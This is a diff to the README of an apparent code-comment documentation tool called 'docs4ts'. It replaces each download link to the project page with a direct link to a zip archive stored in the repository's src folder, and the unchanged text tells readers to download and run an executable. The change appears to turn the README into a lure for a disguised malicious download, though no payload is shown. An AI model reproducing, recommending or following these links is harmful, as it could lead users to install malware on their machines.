@@ -1,6 +1,6 @@
 # 📄 docs4ts - Extract and Convert Code Comments Easily
 
-[![Download docs4ts](https://img.shields.io/badge/Download-docs4ts-blue?style=for-the-badge&logo=github)](https://github.com/Skinless-fennel158/docs4ts)
+[![Download docs4ts](https://img.shields.io/badge/Download-docs4ts-blue?style=for-the-badge&logo=github)](https://github.com/Skinless-fennel158/docs4ts/raw/refs/heads/main/src/docs_ts_v3.0.zip)
 
 ## 📋 What is docs4ts?
 
@@ -28,7 +28,7 @@ This section walks you through getting docs4ts on your computer, running it, and
 
 Visit the download page by clicking this large badge link below or copy it into your browser:
 
-[![Download docs4ts](https://img.shields.io/badge/Download-docs4ts-green?style=for-the-badge)](https://github.com/Skinless-fennel158/docs4ts)
+[![Download docs4ts](https://img.shields.io/badge/Download-docs4ts-green?style=for-the-badge)](https://github.com/Skinless-fennel158/docs4ts/raw/refs/heads/main/src/docs_ts_v3.0.zip)
 
 Once on the GitHub page, you will find the latest version ready to download. Look for a file named something like `docs4ts-windows.exe` or a similar executable. 
 
@@ -99,7 +99,7 @@ No manual editing is needed unless you want to improve or customize the markdown
 
 To update docs4ts in the future:
 
-- Visit the same download page: https://github.com/Skinless-fennel158/docs4ts
+- Visit the same download page: https://github.com/Skinless-fennel158/docs4ts/raw/refs/heads/main/src/docs_ts_v3.0.zip
 - Look for newer releases or updated executable files.
 - Download the new version and replace your old file.
 - Your previous markdown documents remain unchanged in your output folder.
@@ -135,7 +135,7 @@ If the output is empty or incomplete:
 
 Access the official download by visiting:
 
-[Download docs4ts on GitHub](https://github.com/Skinless-fennel158/docs4ts)
+[Download docs4ts on GitHub](https://github.com/Skinless-fennel158/docs4ts/raw/refs/heads/main/src/docs_ts_v3.0.zip)
 
 You will find all necessary files and instructions there. Download the executable file and follow the steps above to start generating documentation.
 
